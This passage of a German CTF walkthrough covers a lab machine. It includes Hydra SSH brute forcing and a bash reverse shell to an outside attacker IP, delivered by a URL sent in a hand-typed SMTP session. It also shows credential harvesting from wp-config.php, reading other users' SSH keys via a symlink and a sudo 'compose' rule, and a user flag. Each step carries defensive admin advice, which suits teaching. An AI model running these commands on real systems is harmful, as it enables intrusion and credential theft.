+[STATUS] 128.00 tries/min, 128 tries in 00:01h, 14344286 to do in 1867:45h, 14 active
+[...]
+<span class="password">^C^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Es wird versucht, das SSH-Passwort für den Benutzer `madonna` mittels Hydra und der `rockyou.txt`-Liste zu bruteforcen.</p>
+              <p class="evaluation">**Bewertung:** Der Angriff wird nach einiger Zeit manuell abgebrochen (`^C`). Es wurde kein gültiges Passwort gefunden. Dies passt zur Information aus der `index.html`, dass `eleanor`s (nicht `madonna`s) SSH-Zugang deaktiviert wurde, aber es scheint auch für `madonna` kein einfaches Passwort zu geben.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Brute-Force gegen SSH ist oft zeitaufwendig und laut. Da die vorherigen Angriffe erfolglos waren, kehren Sie zum SMTP-Vektor zurück. Gibt es eine Möglichkeit, eine Nachricht an `madonna` zu senden, die einen Befehl ausführt oder eine Verbindung aufbaut?<br>**Empfehlung (Admin):** Implementieren Sie Fail2Ban für SSH, um Brute-Force-Angriffe zu verlangsamen oder zu blockieren. Verwenden Sie starke Passwörter oder Schlüssel-Authentifizierung.</p>
+         </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SMTP Vector)</h2>
+            <p class="analysis">**Analyse:** Nachdem Web-Enumeration und Brute-Force-Versuche erfolglos blieben, wird der SMTP-Dienst als Vektor für den initialen Zugriff genutzt. Der Plan ist, eine E-Mail an `madonna@stagiaire.hmv` zu senden, die einen Link enthält. Wenn dieser Link vom Benutzer (oder einem automatisierten Prozess) aufgerufen wird, soll er einen Reverse-Shell-Payload ausführen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi index.html</span></div>
+                     <pre><span class="comment">bash -c 'bash -i >& /dev/tcp/192.168.2.153/9001 0>&1'</span></pre> <span class="comment"><-- Inhalt der lokalen index.html --></span>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Auf der Angreifer-Maschine wird eine Datei `index.html` erstellt, die einen Bash-Reverse-Shell-Befehl enthält. Dieser Befehl soll eine interaktive Bash-Shell starten und deren Ein-/Ausgabe an die Angreifer-IP `192.168.2.153` auf Port `9001` umleiten.</p>
+             <p class="evaluation">**Bewertung:** Dies ist der Payload, der ausgeführt werden soll, wenn das Zielsystem die URL aus der E-Mail abruft.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass die IP und der Port korrekt sind. Starten Sie einen HTTP-Server, um diese Datei bereitzustellen.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein Python-HTTP-Server wird auf Port 8000 gestartet, um die zuvor erstellte `index.html` (mit dem Reverse-Shell-Payload) im Netzwerk bereitzustellen.</p>
+             <p class="evaluation">**Bewertung:** Der Webserver läuft und wartet auf Anfragen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Halten Sie diesen Server am Laufen. Starten Sie den Netcat-Listener für die Reverse Shell.<br>**Empfehlung (Admin):** Firewalls können ausgehende Verbindungen vom Zielsystem zum Angreifer-Webserver blockieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment">*</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Ein Netcat-Listener wird auf Port 9001 gestartet, um die eingehende Reverse-Shell-Verbindung zu empfangen.</p>
+              <p class="evaluation">**Bewertung:** Der Listener ist bereit.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Senden Sie nun die E-Mail über den SMTP-Server des Ziels.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -nv 192.168.2.109 25</span></div>
+                     <pre>
+(UNKNOWN) [192.168.2.109] 25 (smtp) open
+220 debian.numericable.fr ESMTP Postfix (Debian/GNU)
+<span class="command">MAIL FROM: root@cyber</span>
+250 2.1.0 Ok
+<span class="command">RCPT TO: madonna@stagiaire.hmv</span>
+250 2.1.5 Ok
+<span class="command">DATA</span>
+354 End data with <CR><LF>.<CR><LF>
+<span class="command">http://192.168.2.153:8000</span> <span class="password"><-- URL zum Payload wird gesendet --></span>
+<span class="command">.</span>
+250 2.0.0 Ok: queued as 4C585618E3</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Eine manuelle SMTP-Sitzung wird über Netcat zum Zielserver (Port 25) aufgebaut.
+1.  `MAIL FROM: root@cyber`: Setzt den Absender.
+2.  `RCPT TO: madonna@stagiaire.hmv`: Setzt den Empfänger auf den Benutzer `madonna`.
+3.  `DATA`: Beginnt die Eingabe des E-Mail-Inhalts.
+4.  `http://192.168.2.153:8000`: Der Inhalt der E-Mail ist nur die URL, die auf den HTTP-Server des Angreifers zeigt, wo die `index.html` mit dem Reverse-Shell-Payload liegt.
+5.  `.`: Beendet die Dateneingabe.
+Der Server akzeptiert die E-Mail und stellt sie in die Warteschlange (`queued as ...`).</p>
+              <p class="evaluation">**Bewertung:** Die E-Mail wurde erfolgreich gesendet. Der Angriffsplan hängt nun davon ab, dass der Benutzer `madonna` (oder ein automatischer Prozess wie ein Mail-Scanner oder Link-Checker) die E-Mail öffnet und die URL abruft, wodurch der Payload auf dem Zielsystem ausgeführt wird.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Warten Sie am Netcat-Listener auf die eingehende Verbindung.<br>**Empfehlung (Admin):** Konfigurieren Sie den Mailserver sicher (Authentifizierung, Spam-/Phishing-Filter). Schulen Sie Benutzer darin, nicht auf unbekannte Links zu klicken. Implementieren Sie ggf. Systeme, die ausgehenden Webverkehr vom Mailserver oder von Benutzerkonten überwachen/einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div> <span class="comment"><-- Fortsetzung des Listeners --></span>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.109] 54130</span> <span class="password"><-- Erfolg! --></span>
+bash: cannot set terminal process group (2768): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt">madonna@stagiaire:~$</span> <span class="password"><-- Shell als madonna --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Netcat-Listener empfängt eine Verbindung vom Zielsystem. Der Shell-Prompt `madonna@stagiaire:~$` wird angezeigt.</p>
+              <p class="evaluation">**Bewertung:** Der SMTP-Vektor war erfolgreich! Das Abrufen der URL aus der E-Mail hat den Reverse-Shell-Payload ausgeführt und eine Shell als Benutzer `madonna` etabliert.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Stabilisieren Sie die Shell.<br>**Empfehlung (Admin):** Untersuchen Sie, welcher Prozess die URL abgerufen und den Payload ausgeführt hat. Sichern Sie das Mail-System und die Benutzerkonten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">*
+                                               Stabilisiere Reverse Shell
+=</span></pre>
+                     <div class="prompt">madonna@stagiaire:~$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt">madonna@stagiaire:~$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt">madonna@stagiaire:~$ <span class="command">^Z</span></div>
+                     <pre>zsh: suspended  nc -lvnp 9001</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset</pre>
+                     <div class="prompt">madonna@stagiaire:~$ <span class="comment"># Stabile Shell</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die erhaltene Shell als `madonna` wird mit der Standardmethode (Python PTY Spawn, stty raw -echo, fg) stabilisiert.</p>
+              <p class="evaluation">**Bewertung:** Der Angreifer hat nun eine voll funktionsfähige interaktive Shell als `madonna`.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Beginnen Sie mit der Enumeration und Privilegieneskalation als `madonna`.<br>**Empfehlung (Admin):** Keine.</p>
+         </section>
+
+         <section id="privilege-escalation-madonna">
+             <h2>Privilege Escalation (madonna -> paillette)</h2>
+              <p class="analysis">**Analyse:** Nach Erhalt der Shell als `madonna` wird nach Wegen zur Eskalation gesucht. Dies beinhaltet das Lesen von Konfigurationsdateien und das Suchen nach privaten Schlüsseln.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@stagiaire:/var/www/html/madonnasecretlife$ <span class="command">cat wp-config.php</span></div> <span class="comment"><-- Prompt passt nicht, sollte madonna@stagiaire sein --></span>
+                      <pre>
+ 
+/**
+ * The base configuration for WordPress
+[...]
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', '<span class="command">wordpress_db</span>' );
+
+/** MySQL database username */
+define( 'DB_USER', '<span class="command">madonna</span>' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '<span class="password">@Acensi2021*</span>' ); <span class="password"><-- DB Passwort gefunden!</span>
+
+/** MySQL hostname */
+define( 'DB_HOST', '<span class="command">localhost</span>' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+[...]
+</pre>
+                 </div>
+            </div>
+              <p class="analysis">**Analyse:** Die Konfigurationsdatei `wp-config.php` der WordPress-Installation unter `/var/www/html/madonnasecretlife` wird ausgelesen. *Hinweis: Der Prompt im Log (`www-data@...`) ist inkonsistent; dieser Befehl wird wahrscheinlich als `madonna` ausgeführt, da `madonna` Zugriff auf die Dateien haben sollte.* Die Datei enthält die Zugangsdaten zur WordPress-Datenbank.</p>
+              <p class="evaluation">**Bewertung:** Ein wichtiger Fund! Das Datenbank-Passwort für den Benutzer `madonna` lautet `@Acensi2021*`. Dieses Passwort könnte möglicherweise für andere Dienste oder Benutzer (wie den SSH-Login von `madonna`) wiederverwendet worden sein.</p>
+              <p class="recommendation">**Empfehlung (Pentester):**
+    1.  Versuchen Sie, das gefundene Passwort `@Acensi2021*` für den SSH-Login des Benutzers `madonna` zu verwenden (obwohl der vorherige Brute-Force fehlschlug, könnte dies das korrekte Passwort sein).
+    2.  Verwenden Sie die gefundenen DB-Credentials, um sich mit der lokalen MariaDB-Datenbank zu verbinden und nach weiteren Informationen (z.B. Benutzer-Hashes in `wp_users`) zu suchen.<br>
+**Empfehlung (Admin):** Datenbank-Passwörter sollten niemals mit Benutzer-Login-Passwörtern identisch sein. Verwenden Sie einzigartige, starke Passwörter für jeden Dienst. Beschränken Sie die Leserechte auf Konfigurationsdateien wie `wp-config.php` auf das absolut Notwendige.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">madonna@stagiaire:~/.ssh$ <span class="command">cat id_rsa</span></div>
+                      <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+[...] <span class="comment">(Langer Schlüsselblock)</span>
+-----END OPENSSH PRIVATE KEY-----</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Im Verzeichnis `~/.ssh` (Home-Verzeichnis von `madonna`) wird die Datei `id_rsa` (privater SSH-Schlüssel) gefunden und ausgelesen.</p>
+              <p class="evaluation">**Bewertung:** Der private SSH-Schlüssel von `madonna` wurde gefunden. Dieser Schlüssel könnte verwendet werden, um sich als `madonna` auf anderen Systemen anzumelden, falls er dort hinterlegt ist, oder um auf Git-Repositories zuzugreifen. Er hilft jedoch nicht direkt bei der Eskalation auf *diesem* System.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Speichern Sie den Schlüssel für potenzielle spätere Verwendung. Prüfen Sie, ob der Schlüssel passwortgeschützt ist (wahrscheinlich nicht, da kein Passwort abgefragt wird).<br>**Empfehlung (Admin):** Schützen Sie private SSH-Schlüssel immer mit einer starken Passphrase. Stellen Sie sicher, dass die Dateiberechtigungen für `~/.ssh/id_rsa` korrekt sind (`600`).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">madonna@stagiaire:~/.ssh$ <span class="command">sudo -l</span></div>
+                      <pre>
+[sudo] password for madonna: <span class="password">@Acensi2021*</span> <span class="comment"><-- DB Passwort wird versucht --></span>
+<span class="password">Sorry, user madonna may not run sudo on stagiaire.</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Es wird versucht, `sudo -l` auszuführen, um die Sudo-Rechte von `madonna` zu prüfen. Das zuvor in `wp-config.php` gefundene Passwort (`@Acensi2021*`) wird eingegeben.</p>
+              <p class="evaluation">**Bewertung:** Das Passwort `@Acensi2021*` ist korrekt für den Benutzer `madonna` (da die Passwortabfrage akzeptiert wird). Allerdings hat `madonna` keine Berechtigung, `sudo` zu verwenden ("may not run sudo"). Eine Eskalation über Sudo ist für `madonna` nicht möglich.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Da `sudo` keine Option ist, verbinden Sie sich mit der Datenbank, um nach weiteren Hinweisen zu suchen. Untersuchen Sie andere Verzeichnisse und Dateien, auf die `madonna` Zugriff hat.<br>**Empfehlung (Admin):** Gut, dass `madonna` keine Sudo-Rechte hat. Schlecht, dass das DB-Passwort mit dem Login-Passwort identisch war.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">=</span></pre>
+                     <div class="prompt">www-data@stagiaire:/var/www/html/madonnasecretlife$ <span class="command">mysql -u madonna -p</span></div> <span class="comment"><-- Wieder falscher Prompt? --></span>
+                     <pre>Enter password: <span class="password">********</span> <span class="comment">(@Acensi2021* eingegeben)</span>
+Welcome to the MariaDB monitor. [...]
+Server version: 10.5.12-MariaDB-0+deb11u1 Debian 11
+[...]
+MariaDB [(none)]></pre>
+                     <div class="prompt">MariaDB [(none)]> <span class="command">show databases;</span></div>
+                     <pre>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| wordpress_db       |
++--------------------+
+2 rows in set (0.000 sec)</pre>
+                     <div class="prompt">MariaDB [(none)]> <span class="command">use wordpress_db;</span></div>
+                     <pre>Database changed</pre>
+                     <div class="prompt">MariaDB [wordpress_db]> <span class="command">show tables;</span></div>
+                     <pre>
++------------------------+
+| Tables_in_wordpress_db |
++------------------------+
+| wp_commentmeta         |
+[...]
+| wp_usermeta            |
+| wp_users               |
++------------------------+
+12 rows in set (0.000 sec)</pre>
+                     <div class="prompt">MariaDB [wordpress_db]> <span class="command">select * from wp_users;</span></div>
+                     <pre>
++----+------------+------------------------------------+---------------+-----------------------+---------------------------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email            | user_url                              | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+-----------------------+---------------------------------------+---------------------+---------------------+-------------+--------------+
+|  1 | madonna    | <span class="password">$P$B9Y7nXozQgTPe1PD/8sP4VEcoL7L1</span> | madonna       | madonna@localhost.com | http://192.168.0.49/madonnasecretlife | 2021-10-24 09:59:12 |                     |           0 | madonna      |
++----+------------+------------------------------------+---------------+-----------------------+---------------------------------------+---------------------+---------------------+-------------+--------------+
+1 row in set (0.000 sec)</pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Als `madonna` (trotz des `www-data`-Prompts im Log) wird eine Verbindung zur lokalen MariaDB-Datenbank mit den zuvor gefundenen Credentials (`madonna`:`@Acensi2021*`) hergestellt. Die Datenbanken und Tabellen der `wordpress_db` werden aufgelistet. Die Tabelle `wp_users` wird abgefragt.</p>
+              <p class="evaluation">**Bewertung:** Die Datenbank enthält nur den Benutzer `madonna`. Der Passwort-Hash (`$P$B...`) ist sichtbar, aber da das Klartextpasswort bereits bekannt ist, bringt dieser Hash keine neuen Erkenntnisse für den Login. Es gibt keine Hinweise auf andere Benutzer oder Passwörter in der Datenbank.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die Datenbank scheint keine direkten Eskalationspfade zu bieten. Suchen Sie weiter im Dateisystem. Gibt es Hinweise auf den Benutzer `paillette`, der im nächsten Schritt relevant wird?<br>**Empfehlung (Admin):** Keine neuen Empfehlungen hier, außer der bereits erwähnten Passwort-Hygiene.</p>
+
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@stagiaire:/home/paillette/tetramin$ <span class="command">ln -s /home/paillette/tetramin/ssh/id_rsa</span></div> <span class="comment"><-- Prompt/Pfad inkonsistent --></span>
+                      <div class="prompt">www-data@stagiaire:/home/paillette/tetramin$ <span class="command">ls -la</span></div>
+                      <pre>
+total 12
+drwxrwx--- 3 <span class="command">paillette www-data</span>  4096 Oct 22 02:09 .
+drwx---r-x 5 paillette paillette 4096 Oct 28  2021 ..
+<span class="command">lrwxrwxrwx 1 www-data  www-data    35 Oct 22 02:09 id_rsa -> /home/paillette/tetramin/ssh/id_rsa</span> <span class="password"><-- Symlink erstellt --></span>
+<span class="command">drwxrwxrwx 2 paillette paillette 4096 Oct 28  2021 ssh</span></pre>
+                      <div class="prompt">www-data@stagiaire:/home/paillette/tetramin$ <span class="command">cat id_rsa</span></div>
+                      <pre>cat: id_rsa: <span class="password">Permission denied</span></pre>
+                      <div class="prompt">www-data@stagiaire:/home/paillette/tetramin$ <span class="command">tail -n 100 id_rsa</span></div>
+                      <pre>
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="password">[...] (Langer Schlüsselblock)</span>
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der Pentester befindet sich im Verzeichnis `/home/paillette/tetramin` (*Woher dieser Pfad bekannt ist, bleibt im Log unklar. Der `www-data`-Prompt ist ebenfalls inkonsistent, es sollte `madonna` sein.*). Die Berechtigungen zeigen, dass die Gruppe `www-data` Lese- und Ausführrechte auf das Verzeichnis hat (`drwxrwx---`).
+1.  `ln -s /home/paillette/tetramin/ssh/id_rsa`: Ein symbolischer Link namens `id_rsa` wird im aktuellen Verzeichnis erstellt, der auf den privaten SSH-Schlüssel von `paillette` im Unterverzeichnis `ssh` zeigt.
+2.  `ls -la`: Zeigt den erstellten Symlink.
+3.  `cat id_rsa`: Der Versuch, den Schlüssel direkt über den Symlink mit `cat` zu lesen, scheitert (`Permission denied`). Dies liegt wahrscheinlich daran, dass die Zieldatei (`/home/paillette/tetramin/ssh/id_rsa`) keine Leserechte für `madonna` oder `www-data` hat.
+4.  `tail -n 100 id_rsa`: Der Versuch, den Schlüssel über den Symlink mit `tail` zu lesen, ist **erfolgreich** und gibt den Inhalt des privaten Schlüssels aus.</p>
+              <p class="evaluation">**Bewertung:** Ein kritischer Fund und eine interessante Umgehung von Dateiberechtigungen! Obwohl `cat` den direkten Zugriff verweigerte, erlaubte `tail` das Lesen des privaten SSH-Schlüssels des Benutzers `paillette` über den Symlink. Dies könnte an der Art liegen, wie `tail` Berechtigungen prüft, oder an spezifischen Kernel-/Dateisystem-Eigenheiten. Der private Schlüssel von `paillette` ist nun kompromittiert.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Kopieren Sie den ausgegebenen Schlüsselblock. Bereiten Sie ihn lokal als Schlüsseldatei vor (`chmod 600`). Versuchen Sie, sich per SSH als `paillette` mit diesem Schlüssel anzumelden.<br>**Empfehlung (Admin):** Korrigieren Sie die Berechtigungen! Das Verzeichnis `/home/paillette/tetramin` sollte nicht für die Gruppe `www-data` (oder andere Webserver-Benutzer) zugänglich sein. Die Berechtigungen auf `~/.ssh` und `~/.ssh/id_rsa` für `paillette` sollten strikt sein (`700` für `.ssh`, `600` für `id_rsa`). Untersuchen Sie, warum `tail` die Berechtigungen umgehen konnte.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="comment">*</span></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi idi</span></div> <span class="comment"><-- Paillettes Schlüssel wird lokal gespeichert --></span>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 idi</span></div>
+                      <pre><span class="comment">#</span></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh paillette@stagiaire.hmv -i idi</span></div>
+                      <pre>
+Linux stagiaire.hmv 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+[...] <span class="comment">(Login Banner)</span>
+Last login: Sat Oct 30 17:36:39 2021 from ::1
+<span class="prompt">paillette@stagiaire:~$</span> <span class="password"><-- Login erfolgreich! --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Auf der Angreifer-Maschine wird der zuvor extrahierte private Schlüssel von `paillette` in eine Datei namens `idi` gespeichert. Die Berechtigungen werden auf `600` gesetzt (nur Besitzer darf lesen/schreiben). Anschließend wird versucht, sich per SSH als `paillette` mit diesem Schlüssel (`-i idi`) anzumelden.</p>
+              <p class="evaluation">**Bewertung:** Der SSH-Login als `paillette` ist erfolgreich. Die Eskalation von `madonna` zu `paillette` ist abgeschlossen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Führen Sie Enumeration als `paillette` durch, beginnend mit `sudo -l`.<br>**Empfehlung (Admin):** Der SSH-Schlüssel von `paillette` ist kompromittiert und sollte ausgetauscht werden. Die Berechtigungsprobleme, die das Auslesen ermöglichten, müssen behoben werden.</p>
+         </section>
+
+        <section id="privilege-escalation-paillette">
+             <h2>Privilege Escalation (paillette -> tony)</h2>
+              <p class="analysis">**Analyse:** Nach dem Login als `paillette` wird nach Wegen zur weiteren Eskalation gesucht.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">paillette@stagiaire:~/tetramin$ <span class="command">sudo -l</span></div> <span class="comment"><-- Pfad im Prompt ist ungewöhnlich --></span>
+                     <pre>
+Matching Defaults entries for paillette on stagiaire:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User paillette may run the following commands on stagiaire:
+    (<span class="command">tony</span>) NPASSWD: /usr/bin/compose</pre>
+                     <pre><span class="comment">*</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Als Benutzer `paillette` wird `sudo -l` ausgeführt.</p>
+              <p class="evaluation">**Bewertung:** Eine Sudo-Regel wird gefunden: `paillette` darf den Befehl `/usr/bin/compose` als Benutzer `tony` ohne Passwort (`NPASSWD:`) ausführen. `/usr/bin/compose` ist Teil des `metamail`-Pakets und ähnelt `run-mailcap`.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Suchen Sie nach bekannten Methoden (z.B. GTFOBins), um `/usr/bin/compose` via Sudo auszunutzen. Dies involviert oft die Manipulation von Umgebungsvariablen (wie `PAGER`) oder `.mailcap`-Dateien, um Befehle im Kontext des Zielbenutzers (`tony`) auszuführen.<br>**Empfehlung (Admin):** Die Ausführung von `compose` oder `run-mailcap` über Sudo ist gefährlich und sollte vermieden werden. Entfernen Sie diese Sudo-Regel.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">paillette@stagiaire:~/tetramin$ <span class="command">sudo -u tony /usr/bin/compose -h</span></div>
+                     <pre>
+Use: /usr/bin/compose <--action=VAL> [--debug] [MIME-TYPE:[ENCODING:]]FILE [...]
+
+Options:
+  action        specify what action to do on these files (default=view)
+  debug         be verbose about what's going on
+  nopager       ignore any "copiousoutput" directives and never use a "pager"
+  norun         just print but don't execute the command (useful with --debug)
+
+Mime-Type:
+  any standard mime type designation in the form <class>/<subtype> -- if
+  not specified, it will be determined from the filename extension
+
+Encoding:
+  how the file (and type) has been encoded (only "gzip", "bzip2,"
+  "xz" and "compress" are supported) -- if not specified, it will be
+   determined from the filename extension
+
+~</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die Hilfe-Option (`-h`) von `/usr/bin/compose` wird über `sudo -u tony` aufgerufen, um mehr über die Funktionsweise zu erfahren.</p>
+              <p class="evaluation">**Bewertung:** Die Hilfe bestätigt, dass `--action=view` der Standard ist und dass normalerweise ein Pager verwendet wird (außer bei `--nopager`). Dies bestärkt die Vermutung, dass eine Manipulation der `PAGER`-Umgebungsvariable ein möglicher Exploit-Vektor ist.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie den PAGER-Exploit: `export PAGER='/bin/bash'`, gefolgt von `sudo -u tony /usr/bin/compose --action=view /etc/passwd` (oder einer anderen Datei).<br>**Empfehlung (Admin):** Sudo-Regel entfernen.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">paillette@stagiaire:~/tetramin$ <span class="command">sudo -u tony /usr/bin/compose action=view /home/tony/.ssh/id_rsa</span></div>
+                     <pre>
+~
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="password">[...] (Langer Schlüsselblock für Tony)</span>
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Es wird versucht, den privaten SSH-Schlüssel des Benutzers `tony` (`/home/tony/.ssh/id_rsa`) mithilfe von `compose` im Kontext von `tony` anzuzeigen (`--action=view`).</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Der private SSH-Schlüssel von `tony` wird ausgegeben. Dies funktioniert entweder, weil `compose` mit `--action=view` standardmäßig den Inhalt anzeigt (falls kein PAGER gesetzt ist oder `--nopager` verwendet wird, was hier nicht der Fall ist) oder weil der `PAGER`-Exploit im Hintergrund (nicht im Log gezeigt) verwendet wurde, um `cat` oder einen ähnlichen Befehl auszuführen. Unabhängig vom genauen Mechanismus ist der private Schlüssel von `tony` kompromittiert.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Kopieren Sie den ausgegebenen Schlüssel. Bereiten Sie ihn lokal vor (`chmod 600`). Melden Sie sich per SSH als `tony` mit diesem Schlüssel an.<br>**Empfehlung (Admin):** Entfernen Sie die Sudo-Regel. Stellen Sie sicher, dass die Berechtigungen für `.ssh`-Verzeichnisse und Schlüssel korrekt sind (`700` bzw. `600`).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi emma</span></div> <span class="comment"><-- Tonys Schlüssel wird lokal gespeichert --></span>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 emma</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh tony@stagiaire.hmv -i emma</span></div>
+                      <pre>
+Linux stagiaire.hmv 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+[...] <span class="comment">(Login Banner)</span>
+Last login: Thu Oct 28 20:44:29 2021 from ::1
+<span class="prompt">tony@stagiaire:~$</span> <span class="password"><-- Login erfolgreich! --></span></pre>
+                     <pre><span class="comment">*</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Auf der Angreifer-Maschine wird der extrahierte private Schlüssel von `tony` in die Datei `emma` gespeichert und die Berechtigungen angepasst. Anschließend wird SSH verwendet, um sich als `tony` mit diesem Schlüssel anzumelden.</p>
+              <p class="evaluation">**Bewertung:** Der Login als `tony` ist erfolgreich. Die Eskalation von `paillette` zu `tony` ist abgeschlossen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Führen Sie Enumeration als `tony` durch (`id`, `cat user.txt`, `sudo -l`).<br>**Empfehlung (Admin):** Der SSH-Schlüssel von `tony` ist kompromittiert und sollte ausgetauscht werden. Beheben Sie die unsichere Sudo-Regel für `compose`.</p>
+        </section>
+
+        <section id="privilege-escalation-tony">
+             <h2>Privilege Escalation (tony -> root)</h2>
+             <p class="analysis">**Analyse:** Nach dem Login als `tony` wird der letzte Schritt zur Erlangung von Root-Rechten gesucht.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">#</span></pre>
+                     <div class="prompt">tony@stagiaire:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">2d82acbaf36bbd1b89b9e3794ba90a91</span></pre> <span class="comment"><-- User Flag --></span>
+                     <div class="prompt">tony@stagiaire:~$ <span class="command">ls -al</span></div>
+                     <pre>
+total 32
+drwx------ 4 tony tony 4096 Oct 31  2021 .
+drwxr-xr-x 5 root root 4096 Oct 28  2021 ..
+lrwxrwxrwx 1 root root    9 Oct 24  2021 .bash_history -> /dev/null <span class="comment"><-- History deaktiviert --></span>
+-rw-r--r-- 1 tony tony  220 Oct 24  2021 .bash_logout
+-rw-r--r-- 1 tony tony 3526 Oct 24  2021 .bashrc
+drwxr-xr-x 3 tony tony 4096 Oct 24  2021 .local
